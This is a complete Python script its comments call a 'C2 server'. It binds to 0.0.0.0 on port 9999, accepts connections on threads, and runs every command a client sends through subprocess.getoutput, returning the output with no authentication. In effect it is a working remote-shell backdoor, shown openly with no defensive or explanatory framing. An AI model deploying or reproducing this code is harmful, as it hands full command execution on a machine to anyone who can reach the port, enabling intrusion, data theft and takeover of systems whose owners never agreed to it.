import socket
import threading
import subprocess

# Function to handle each client connection
def handle_client(client_socket):
    while True:
        try:
            # Receive command from the client
            command = client_socket.recv(1024).decode()
            if not command:
                break
            if command.lower() == "exit":
                break
            # Execute the command and get the output
            output = subprocess.getoutput(command)
            # Send the output back to the client
            client_socket.send(output.encode())
        except Exception as e:
            # If there's an error, send the error message
            client_socket.send(f"Error: {str(e)}".encode())
            break
    client_socket.close()

# Main function to start the C2 server
def start_server(host='0.0.0.0', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        # Start a new thread to handle the client connection
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

# Start the C2 server
start_server()